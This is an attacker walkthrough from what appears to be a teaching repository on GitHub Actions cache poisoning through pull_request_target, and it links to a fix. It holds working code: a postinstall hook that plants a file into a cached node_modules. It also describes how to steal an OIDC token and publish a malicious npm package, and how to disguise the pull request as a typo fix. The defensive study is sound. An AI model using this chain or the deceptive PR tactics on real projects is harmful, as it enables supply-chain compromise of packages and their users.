# Attacker walkthrough

You are the attacker. You have a free GitHub account. You have no relationship to the target repo or its maintainers.

The package you want to compromise is published from this repo to npm on every push to `main`. The repo uses OIDC trusted publishing — there is no static npm token to steal.

Here is your plan.

## What you control

- The contents of any pull request you open.
- The branch name and PR title.
- Files added/modified by the PR.

That's it. You have no commit access. You can't merge. You can't read secrets.

## What you exploit

Two facts about the target's CI:

1. The `bundle-size` workflow uses `pull_request_target` and checks out your PR's HEAD.
2. It writes `node_modules` into a cache that the `release` workflow restores on every push to `main`.

You don't need to read those workflow files to attack — they're public on GitHub.

## Step 1: Fork the repo

From the attacker GitHub account, click "Fork" on the target repo. You now have a writable copy.

## Step 2: Plant the payload

In your fork, on a new branch, modify `package.json` to add a `postinstall` script:

```json
{
  "name": "demo-cache-poisoning-target",
  "version": "0.1.0",
  "scripts": {
    "build": "mkdir -p dist && cp src/index.js dist/index.js",
    "postinstall": "node attack/payload/plant.js"
  }
}
```

And add `attack/payload/plant.js`:

```js
// Runs during `npm install` in the PR-triggered bundle-size workflow.
// In the real attack, this would write a malicious file deep inside
// node_modules — for example, replacing the `index.js` of a transitive
// dep that the build step (esbuild, rollup, etc.) is guaranteed to load.
//
// For this demo we plant a small JS file inside an obvious place so the
// release workflow's build step picks it up.
const fs = require('fs');
const path = require('path');

const detonator = `
// This file was planted in node_modules by attacker's PR-triggered postinstall.
// It only runs when the cache is restored into a privileged release context.
const fs = require('fs');
const marker = '/tmp/cache-poisoning-marker-' + Date.now() + '.json';
fs.writeFileSync(marker, JSON.stringify({
  message: 'DETONATED in release context',
  github_ref: process.env.GITHUB_REF,
  github_workflow: process.env.GITHUB_WORKFLOW,
  github_event_name: process.env.GITHUB_EVENT_NAME,
  has_id_token_url: Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_URL),
  has_id_token_secret: Boolean(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN),
  timestamp: new Date().toISOString(),
}, null, 2));
console.log('[DEMO] detonator wrote marker to', marker);
`;

const target = path.join(__dirname, '..', '..', 'node_modules', '.detonator.js');
fs.mkdirSync(path.dirname(target), { recursive: true });
fs.writeFileSync(target, detonator);
console.log('[ATTACK] planted detonator at', target);
```

And modify `package.json`'s `build` script to require the planted file (simulating a real attack where the planted file is loaded by a real build tool walking `node_modules`):

```json
"build": "node -e \"try{require('./node_modules/.detonator.js')}catch(e){}\" && mkdir -p dist && cp src/index.js dist/index.js"
```

In a real attack you would not need to modify `build` — you'd plant your file *as* a real dependency that the build already loads (e.g. as the `index.js` of an inner `node_modules/lodash.something/`). The modification here is just to make the demo deterministic without pulling real third-party packages.

Also do something cosmetically innocent — fix a typo in `README.md`, anything. This makes the PR look like a contribution.

## Step 3: Open the PR

Open a pull request from your fork's branch into the target repo's `main`.

PR title: `docs: fix typo in README`

PR description: brief, friendly, focused on the README change. Do not mention `package.json` changes; the diff is right there for anyone who looks.

## Step 4: Watch the workflow run

GitHub triggers the target's `bundle-size` workflow on your PR. Because the workflow uses `pull_request_target`, it runs in the *target* repo's trust context. Because it checks out your PR's HEAD, it runs your `package.json`. Because `npm install` triggers your `postinstall`, it plants `.detonator.js` inside `node_modules`. Because the workflow caches `node_modules`, the planted file lands in the shared cache.

The workflow finishes successfully. The bundle size comment posts. Nothing looks wrong.

**You are done. You can close the PR now.** The cache is poisoned. The exploit has nothing further to do until a maintainer pushes to `main`.

## Step 5: Wait

Sooner or later — minutes, hours, days — someone pushes to `main`. A maintainer fixes a typo. Dependabot merges a PR. Anything.

The `release` workflow restores the cache. `node_modules/.detonator.js` is now on disk. The `build` step loads it. The detonator runs **inside the release job**, with `id-token: write` in scope.

In this demo: it writes `/tmp/cache-poisoning-marker-*.json`. Run logs show the marker path.

In a real attack: it reads `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` from its environment, calls `${url}&audience=npm` to mint a GitHub OIDC JWT scoped to this workflow, posts that to `https://registry.npmjs.org/-/npm/v1/oidc/token/exchange` to get an npm publish token, posts a malicious tarball to `https://registry.npmjs.org/<package>` using that token. ~200ms. Logs show a normal release.

## Verifying the attack succeeded (in this demo)

After the maintainer pushes to `main` and the release workflow runs, find the marker file in the release job's logs (the planted JS `console.log`s its path) or download it via the workflow run's debug artifact step.

```
[DEMO] detonator wrote marker to /tmp/cache-poisoning-marker-1715800000000.json
```

The marker's contents show that the attacker's code had:
- `github_workflow: release (VULNERABLE)` — proves it ran in the release workflow, not bundle-size
- `has_id_token_url: true` — proves OIDC was available
- `has_id_token_secret: true` — proves the JWT-minting endpoint was reachable

That's the entire attack.

## Cleanup after demo

- Close the malicious PR.
- In GitHub repo settings → Actions → Caches, manually delete the poisoned `node-modules-*` cache.
- Better: switch to the safe workflows. See [`../fix/README.md`](../fix/README.md).
